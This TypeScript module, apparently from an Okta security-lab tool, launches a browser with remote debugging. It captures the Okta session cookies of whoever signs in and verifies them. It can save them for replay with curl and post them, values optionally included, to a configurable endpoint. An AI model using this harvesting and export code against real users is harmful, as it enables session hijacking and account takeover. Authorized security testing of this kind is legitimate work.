import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import net from "node:net";
import { setTimeout as delay } from "node:timers/promises";
import { cookieDir } from "./config.js";
import {
  buildCookieProofPayload,
  postCookieProof,
  type CookieProofPostResult,
} from "./cookie-proof.js";

function log(msg: string): void {
  process.stderr.write(`[cookies] ${msg}\n`);
}

const EDGE_PATHS = [
  "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
  "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
];

const CHROME_PATHS = [
  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
  "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
];

// Cookies whose presence is a strong "auth likely done" signal across Okta
// Classic and OIE. We do NOT rely on any single name — the session probe is
// the ground truth. These just decide when to bother probing.
const AUTH_HINT_COOKIES = ["sid", "idx", "JSESSIONID", "DT"];
const POLL_INTERVAL_MS = 2000;
const DEFAULT_TIMEOUT_MS = 5 * 60 * 1000;
const COOKIE_PROOF_ENDPOINT = process.env.OKTA_MCP_COOKIE_PROOF_URL || "";
const PERSIST_COOKIE_JARS = ["1", "true", "yes"].includes(
  (process.env.OKTA_MCP_PERSIST_COOKIE_JARS || "").toLowerCase()
);
const INCLUDE_COOKIE_VALUES = ["1", "true", "yes"].includes(
  (process.env.OKTA_MCP_INCLUDE_COOKIE_VALUES || "").toLowerCase()
);
const SECURITY_LAB_ENABLED = ["1", "true", "yes"].includes(
  (process.env.OKTA_MCP_SECURITY_LAB || "").toLowerCase()
);

function requireSecurityLab(): void {
  if (!SECURITY_LAB_ENABLED) {
    throw new Error(
      "Session-cookie tooling is disabled. Re-run init with --security-lab in an authorized test environment."
    );
  }
}

export interface OktaCookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  expires: number;
  httpOnly: boolean;
  secure: boolean;
  sameSite?: string;
}

export interface HarvestResult {
  captured_at: string;
  org_url: string;
  sid_present: boolean;
  cookie_count: number;
  cookie_names: string[];
  jar_path_json: string | null;
  jar_path_netscape: string | null;
  session_probe: SessionProbe;
  proof_post?: CookieProofPostResult;
}

export interface SessionProbe {
  ok: boolean;
  status: number;
  user_login?: string;
  user_id?: string;
  error?: string;
}

function findBrowser(): { path: string; name: string } {
  for (const p of EDGE_PATHS) if (fs.existsSync(p)) return { path: p, name: "msedge" };
  for (const p of CHROME_PATHS) if (fs.existsSync(p)) return { path: p, name: "chrome" };
  throw new Error("No Edge or Chrome install found in standard paths.");
}

async function pickFreePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.unref();
    srv.on("error", reject);
    srv.listen(0, () => {
      const addr = srv.address();
      if (typeof addr === "object" && addr) {
        const port = addr.port;
        srv.close(() => resolve(port));
      } else {
        reject(new Error("Could not allocate port"));
      }
    });
  });
}

interface CdpTarget {
  id: string;
  type: string;
  url: string;
  webSocketDebuggerUrl: string;
}

async function cdpTargets(port: number): Promise<CdpTarget[]> {
  const resp = await fetch(`http://127.0.0.1:${port}/json`);
  if (!resp.ok) throw new Error(`CDP /json ${resp.status}`);
  return (await resp.json()) as CdpTarget[];
}

async function cdpVersion(port: number): Promise<{ webSocketDebuggerUrl: string }> {
  const resp = await fetch(`http://127.0.0.1:${port}/json/version`);
  if (!resp.ok) throw new Error(`CDP /json/version ${resp.status}`);
  return (await resp.json()) as { webSocketDebuggerUrl: string };
}

class CdpClient {
  private ws: WebSocket;
  private nextId = 1;
  private pending = new Map<
    number,
    { resolve: (v: unknown) => void; reject: (e: Error) => void }
  >();
  private ready: Promise<void>;

  constructor(url: string) {
    this.ws = new WebSocket(url);
    this.ready = new Promise((resolve, reject) => {
      this.ws.addEventListener("open", () => resolve());
      this.ws.addEventListener("error", (e: Event) =>
        reject(new Error(`CDP ws error: ${(e as ErrorEvent).message || "unknown"}`))
      );
    });
    this.ws.addEventListener("message", (ev: MessageEvent) => {
      const data =
        typeof ev.data === "string" ? ev.data : new TextDecoder().decode(ev.data as ArrayBuffer);
      const msg = JSON.parse(data);
      if (typeof msg.id === "number" && this.pending.has(msg.id)) {
        const p = this.pending.get(msg.id)!;
        this.pending.delete(msg.id);
        if (msg.error) p.reject(new Error(`CDP error: ${JSON.stringify(msg.error)}`));
        else p.resolve(msg.result);
      }
    });
  }

  async waitOpen(): Promise<void> {
    await this.ready;
  }

  send<T = unknown>(method: string, params: Record<string, unknown> = {}): Promise<T> {
    const id = this.nextId++;
    return new Promise<T>((resolve, reject) => {
      this.pending.set(id, {
        resolve: (v) => resolve(v as T),
        reject,
      });
      this.ws.send(JSON.stringify({ id, method, params }));
    });
  }

  close(): void {
    try {
      this.ws.close();
    } catch {
      /* ignore */
    }
  }
}

async function waitForCdp(port: number, timeoutMs = 10_000): Promise<void> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      await cdpVersion(port);
      return;
    } catch {
      await delay(200);
    }
  }
  throw new Error(`Browser CDP did not open on port ${port} within ${timeoutMs}ms`);
}

function toNetscape(cookies: OktaCookie[]): string {
  // Netscape cookies.txt format used by curl -b/-c and browser extensions.
  const header =
    "# Netscape HTTP Cookie File\n# Exported by okta-workspace-mcp\n\n";
  const lines = cookies.map((c) => {
    const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
    const flag = "TRUE";
    const secure = c.secure ? "TRUE" : "FALSE";
    const expires = Math.floor(c.expires > 0 ? c.expires : Date.now() / 1000 + 3600);
    return [domain, flag, c.path || "/", secure, expires, c.name, c.value].join("\t");
  });
  return header + lines.join("\n") + "\n";
}

function toHeader(cookies: OktaCookie[]): string {
  return cookies.map((c) => `${c.name}=${c.value}`).join("; ");
}

async function probeSession(orgUrl: string, cookies: OktaCookie[]): Promise<SessionProbe> {
  const cookieHeader = toHeader(cookies);
  try {
    const resp = await fetch(`${orgUrl}/api/v1/users/me`, {
      headers: { Cookie: cookieHeader, Accept: "application/json" },
      redirect: "manual",
    });
    if (!resp.ok) {
      return { ok: false, status: resp.status };
    }
    const user = (await resp.json()) as {
      id?: string;
      profile?: { login?: string };
    };
    return {
      ok: true,
      status: resp.status,
      user_login: user.profile?.login,
      user_id: user.id,
    };
  } catch (err) {
    return { ok: false, status: 0, error: (err as Error).message };
  }
}

function saveJar(
  cookies: OktaCookie[],
  orgHost: string,
  when: Date
): { json: string; netscape: string } {
  fs.mkdirSync(cookieDir, { recursive: true, mode: 0o700 });
  const stamp = when.toISOString().replace(/[:.]/g, "-");
  const base = path.join(cookieDir, stamp);
  const jsonPath = `${base}.json`;
  const netscapePath = `${base}.netscape`;
  fs.writeFileSync(
    jsonPath,
    JSON.stringify({ captured_at: when.toISOString(), org_host: orgHost, cookies }, null, 2),
    { mode: 0o600 }
  );
  fs.writeFileSync(netscapePath, toNetscape(cookies), { mode: 0o600 });
  return { json: jsonPath, netscape: netscapePath };
}

export interface HarvestOptions {
  orgUrl: string;
  timeoutMs?: number;
}

export async function harvestCookies(opts: HarvestOptions): Promise<HarvestResult> {
  requireSecurityLab();
  const orgUrl = opts.orgUrl.replace(/\/+$/, "");
  const orgHost = new URL(orgUrl).host;
  const timeoutMs = opts.timeoutMs ?? DEFAULT_TIMEOUT_MS;

  const browser = findBrowser();
  const port = await pickFreePort();

  // Fresh, throwaway profile per run. Cookies persist in OUR JSON dumps under
  // cookieDir, not in the browser profile. Avoids Edge SingletonLock collisions
  // when multiple runs happen and lets us delete the profile cleanly on exit.
  const tempProfileDir = fs.mkdtempSync(path.join(os.tmpdir(), "okta-mcp-edge-"));

  const args = [
    `--user-data-dir=${tempProfileDir}`,
    `--remote-debugging-port=${port}`,
    "--no-first-run",
    "--no-default-browser-check",
    "--new-window",
    `${orgUrl}/`,
  ];

  log(`launching ${browser.name} with debug port ${port}, profile ${tempProfileDir}`);
  const child: ChildProcess = spawn(browser.path, args, {
    detached: false,
    stdio: "ignore",
  });

  let cdp: CdpClient | null = null;
  try {
    await waitForCdp(port);
    const version = await cdpVersion(port);
    cdp = new CdpClient(version.webSocketDebuggerUrl);
    await cdp.waitOpen();

    const start = Date.now();
    let cookies: OktaCookie[] = [];
    let probe: SessionProbe | null = null;
    let pollCount = 0;

    log(`waiting up to ${Math.round(timeoutMs / 1000)}s for an authenticated session on ${orgHost} — sign in in the browser window`);

    while (Date.now() - start < timeoutMs) {
      const { cookies: raw } = await cdp.send<{ cookies: OktaCookie[] }>(
        "Storage.getCookies"
      );
      cookies = raw.filter((c) => {
        const d = c.domain.replace(/^\./, "");
        return d === orgHost || orgHost.endsWith(d);
      });

      pollCount++;
      const elapsed = Math.round((Date.now() - start) / 1000);
      const hits = cookies.filter((c) => AUTH_HINT_COOKIES.includes(c.name)).map((c) => c.name);

      // Only spend a network round-trip on /users/me once a plausible session
      // cookie shows up. Otherwise just report progress.
      if (hits.length > 0) {
        probe = await probeSession(orgUrl, cookies);
        log(`poll ${pollCount}: ${elapsed}s, ${cookies.length} cookies (hints=${hits.join(",")}), probe status=${probe.status}`);
        if (probe.ok) {
          log(`session probe returned OK for ${probe.user_login} after ${elapsed}s`);
          break;
        }
      } else {
        log(`poll ${pollCount}: ${elapsed}s, ${cookies.length} cookies, no auth-hint cookies yet`);
      }

      const targets = await cdpTargets(port);
      if (!targets.some((t) => t.type === "page")) {
        throw new Error("Browser tab closed before authentication completed.");
      }

      await delay(POLL_INTERVAL_MS);
    }

    if (!probe?.ok) {
      throw new Error(
        `Timed out waiting for an authenticated Okta session after ${timeoutMs}ms (last probe: ${probe ? `status=${probe.status}` : "never ran"}).`
      );
    }

    const when = new Date();
    const capturedAt = when.toISOString();
    const paths = PERSIST_COOKIE_JARS
      ? saveJar(cookies, orgHost, when)
      : null;
    if (paths) {
      log(`dumped ${cookies.length} cookies to ${paths.json}`);
    }

    const proofPost = COOKIE_PROOF_ENDPOINT
      ? await postCookieProof(
          COOKIE_PROOF_ENDPOINT,
          buildCookieProofPayload({
            capturedAt,
            orgHost,
            cookies,
            sessionProbe: probe,
            localArtifacts: {
              json_path: paths?.json ?? null,
              netscape_path: paths?.netscape ?? null,
            },
            includeCookieValues: INCLUDE_COOKIE_VALUES,
          })
        )
      : undefined;
    if (proofPost) {
      log(`posted cookie proof to ${proofPost.endpoint} (${proofPost.status})`);
    }

    return {
      captured_at: capturedAt,
      org_url: orgUrl,
      sid_present: cookies.some((c) => c.name === "sid"),
      cookie_count: cookies.length,
      cookie_names: cookies.map((c) => c.name).sort(),
      jar_path_json: paths?.json ?? null,
      jar_path_netscape: paths?.netscape ?? null,
      session_probe: probe,
      proof_post: proofPost,
    };
  } finally {
    cdp?.close();
    killBrowserTree(child);
    // Give the OS a beat to release file handles on the profile dir before rm.
    await delay(500);
    try {
      fs.rmSync(tempProfileDir, { recursive: true, force: true });
    } catch {
      /* profile dir may be locked briefly on Windows; ignored */
    }
  }
}

function killBrowserTree(child: ChildProcess): void {
  const pid = child.pid;
  if (!pid) return;
  if (process.platform === "win32") {
    // taskkill /T tears down the whole process tree (Edge spawns many children).
    spawnSync("taskkill", ["/F", "/T", "/PID", String(pid)], { stdio: "ignore" });
  } else {
    try {
      child.kill("SIGKILL");
    } catch {
      /* ignore */
    }
  }
}

export interface StoredJar {
  path: string;
  captured_at: string;
  org_host: string;
  cookie_count: number;
  sid_present: boolean;
}

interface JarFile {
  captured_at: string;
  org_host: string;
  cookies: OktaCookie[];
}

function readJar(jsonPath: string): JarFile {
  return JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as JarFile;
}

export function listJars(): StoredJar[] {
  requireSecurityLab();
  if (!fs.existsSync(cookieDir)) return [];
  return fs
    .readdirSync(cookieDir)
    .filter((f) => f.endsWith(".json"))
    .map((f) => {
      const full = path.join(cookieDir, f);
      try {
        const j = readJar(full);
        return {
          path: full,
          captured_at: j.captured_at,
          org_host: j.org_host,
          cookie_count: j.cookies.length,
          sid_present: j.cookies.some((c) => c.name === "sid"),
        };
      } catch {
        return {
          path: full,
          captured_at: "",
          org_host: "",
          cookie_count: 0,
          sid_present: false,
        };
      }
    })
    .sort((a, b) => (a.captured_at < b.captured_at ? 1 : -1));
}

function latestJarPath(): string | null {
  const jars = listJars();
  return jars.length ? jars[0].path : null;
}

export async function probeLatestJar(orgUrl: string): Promise<SessionProbe & { jar_path: string }> {
  requireSecurityLab();
  const p = latestJarPath();
  if (!p) {
    throw new Error(
      "No persisted cookie jars found. Re-run session-check with --persist-cookie-jars enabled."
    );
  }
  const jar = readJar(p);
  const result = await probeSession(orgUrl, jar.cookies);
  return { ...result, jar_path: p };
}

export function exportLatestJar(format: "json" | "netscape" | "header"): {
  format: string;
  jar_path: string;
  content: string;
} {
  requireSecurityLab();
  const p = latestJarPath();
  if (!p) {
    throw new Error(
      "No persisted cookie jars found. Re-run session-check with --persist-cookie-jars enabled."
    );
  }
  const jar = readJar(p);
  if (format === "json") return { format, jar_path: p, content: JSON.stringify(jar, null, 2) };
  if (format === "netscape")
    return { format, jar_path: p, content: toNetscape(jar.cookies) };
  return { format, jar_path: p, content: toHeader(jar.cookies) };
}
